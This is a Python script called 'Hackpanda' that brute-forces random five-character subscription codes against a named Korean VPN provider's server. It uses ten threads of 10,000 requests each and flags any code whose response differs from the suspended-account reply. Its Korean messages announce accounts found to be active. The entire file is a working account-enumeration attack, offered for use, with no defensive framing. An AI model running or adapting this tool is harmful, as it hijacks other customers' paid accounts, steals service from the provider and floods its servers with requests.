#final version of Hackpanda

import string
import random
import threading
import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup


def word_gen():
    word_list = string.ascii_letters[:52]
    # gen_value = ""
    ma_choice = random.randrange(5)
    num_list = string.digits[:10]

    #abcd choice indic
    a = word_list[random.randrange(52)]
    b = word_list[random.randrange(52)]
    c = word_list[random.randrange(52)]
    d = word_list[random.randrange(52)]
    num = num_list[random.randrange(10)]

    if ma_choice == 0:
        return a + b + c + d + num
    elif ma_choice == 1:
        return a + b + c + num + d
    elif ma_choice == 2:
        return a + b + num + c + d
    elif ma_choice == 3:
        return a + num + b + c + d
    else:
        return num + a + b + c + d

def Hack_Panda(try_num):
    tries = 0
    while tries < try_num:
        got_num = word_gen()
        r = requests.get("http://ss.pandavpn.co.kr/s/{}".format(got_num))
        c = r.content
        html = str(BeautifulSoup(c, "html.parser"))
        if html == "c3NyOi8vT0M0NExqZ3VPRG80T0RnNE9tOXlhV2RwYmpwdWIyNWxPbkJzWVdsdU9rMUVRWGROUVM4X2IySm1jM0JoY21GdFBTWndjbTkwYjNCaGNtRnRQU1p5WlcxaGNtdHpQVGRKUzNNM1NuRndTVTl4ZDJkUGRVdHdaVEpXYmtORWNtaGlhbkpyTlhkbk5qVnBVVFkwY1ZWSlQzRjZhRTk1WjJ4bGVXUjBRMFJ4ZFVscWMzQTBSSEpyU21wemJISlJaemRLTmtrMmNrZDNOalJMV1VsUGNURnlUM1ZRYUdWNVpIUkRSSEYxU1dwemNEUkVjbXRLYW5Oc2NsRm5OMG8yU1RkSmNURTJOSFZKTmpSMWEweG5KbWR5YjNWd1BWWnNRazhtZFdSd2NHOXlkRDB3Sm5WdmREMHcK":
            print("{} 은 이미 정지된 계정입니다.".format(got_num))
        else:
            print("[ohyeah] {} 는 정지되지 않았습니다.".format(got_num))
            while True:
                print("we found {} this".format(got_num))
            break
        tries += 1
        r.close()

def execute():
    print("Thread Pool Excutor 를 시작합니다")
    with ThreadPoolExecutor(max_workers=10) as tpe:
        a = 10000
        worker1 = tpe.submit(Hack_Panda, (a))
        worker10 = tpe.submit(Hack_Panda, (a))
        worker9 = tpe.submit(Hack_Panda, (a))
        worker8 = tpe.submit(Hack_Panda, (a))
        worker7 = tpe.submit(Hack_Panda, (a))
        worker6 = tpe.submit(Hack_Panda, (a))
        worker5 = tpe.submit(Hack_Panda, (a))
        worker4 = tpe.submit(Hack_Panda, (a))
        worker3 = tpe.submit(Hack_Panda, (a))
        worker2 = tpe.submit(Hack_Panda, (a))
    print("Success")

execute()